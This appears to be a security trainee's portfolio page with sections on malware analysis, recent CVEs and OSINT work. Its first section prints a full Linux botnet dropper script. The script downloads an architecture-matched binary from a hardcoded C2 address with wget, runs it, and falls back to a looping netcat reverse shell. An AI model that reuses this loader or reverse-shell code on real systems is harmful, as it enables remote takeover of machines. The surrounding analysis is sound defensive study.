## 1. Analyse malware samples safely

URL: [Malware Bazaar](https://bazaar.abuse.ch/download/8484495fd9d94be6944c2cb49016ad65d31e5dcf8fb690213e155553e71df610/)
Malware Type: Dropper / Botnet loader
Malware Target: Linux

Malware Code: 
```Bash
#!/bin/sh
C2_HOST="5.230.154.106"
C2_PORT="8080"
BOT_ID="test123"

echo "[bot] starting"

arch=$(uname -m)
bin=""
if [ "$arch" = "x86_64" ] || [ "$arch" = "amd64" ]; then
    bin="bot_x86_64"
elif [ "$arch" = "i386" ] || [ "$arch" = "i486" ] || [ "$arch" = "i586" ] || [ "$arch" = "i686" ]; then
    bin="bot_x86"
elif [ "$arch" = "armv7l" ] || [ "$arch" = "armv8" ] || [ "$arch" = "aarch64" ]; then
    bin="bot_arm64"
elif [ "$arch" = "armv5l" ] || [ "$arch" = "armv6l" ]; then
    bin="bot_arm5"
elif [ "$arch" = "arm" ]; then
    bin="bot_arm"
elif [ "$arch" = "mips" ]; then
    bin="bot_mips"
elif [ "$arch" = "mipsel" ]; then
    bin="bot_mipsel"
elif [ "$arch" = "ppc" ] || [ "$arch" = "ppc64" ]; then
    bin="bot_ppc"
fi

if [ -n "$bin" ]; then
    echo "[bot] trying $bin"
    if command -v wget >/dev/null 2>&1; then
        wget -q -T 10 -t 1 -O /tmp/bot "http://${C2_HOST}:${C2_PORT}/${bin}" 2>/dev/null
    fi
    chmod +x /tmp/bot 2>/dev/null
    if [ -x /tmp/bot ]; then
        echo "[bot] executing binary"
        /tmp/bot "$BOT_ID" "$C2_HOST"
    fi
fi

echo "[bot] shell fallback"
while true; do
    if command -v nc >/dev/null 2>&1; then
        nc -w 5 "$C2_HOST" "$C2_PORT" -e /bin/sh 2>/dev/null
    fi
    sleep 10
done
```

#### What the script does

It detects the system architecture, downloads a matching malware binary from a hardcoded command-and-control (C2) server, runs it, and falls back to a reverse-shell loop if that fails.

---
## 2. Research recent CVEs

#### [WordPress Core (CVE-2026-119977)](https://cert.ug/index.php/wordpress-core-flaw-exploited-during-software-upgrade-process-itself-cve-2026-119977)

This is a **time-of-check time-of-use (TOCTOU) race condition** that allows for unauthenticated remote code execution. The flaw is only exploitable during a narrow window when a full WordPress core update is in progress. CISA added it to its Known Exploited Vulnerabilities (KEV) catalog on November 4, 2026, with a federal patch deadline of November 6. Wordfence reported blocking over 12,000 exploitation attempts shortly after disclosure.

#### [GitLab (CVE-2026-97229)](https://www.cve.org/CVERecord?id=CVE-2026-97229)

An integer overflow vulnerability in both Community and Enterprise Editions. CISA added it to the KEV catalog based on evidence of active exploitation.

#### [Linux Kernel (CVE-2026-64561 & CVE-2026-64564)](https://www.govcert.gov.hk/en/alerts_detail.php?id=2008)

Two privilege escalation vulnerabilities dubbed "Zapscape" and "SCTPhantom." Public proof-of-concept code exists for Zapscape, which could allow a guest VM to escape to the host.

---
## 3. Perform OSINT Investigations

![OhSINT investigation](others/OhSINT.png)

![SearchLight investigation](others/SearchLight.png)

---
## [4. Documenting Mirai-Style IoT Botnet Dropper](others/Documenting%20Botnet%20Dropper.md)

---
## [5. Vulnerability Report - VULN-2026-1106-001](others/Vulnerability%20Report%20-%20VULN-2026-1106-001.md)

---
## Reference

- [Youtube - Vulnerability Report](https://youtu.be/BaM-4nKcd6Y)
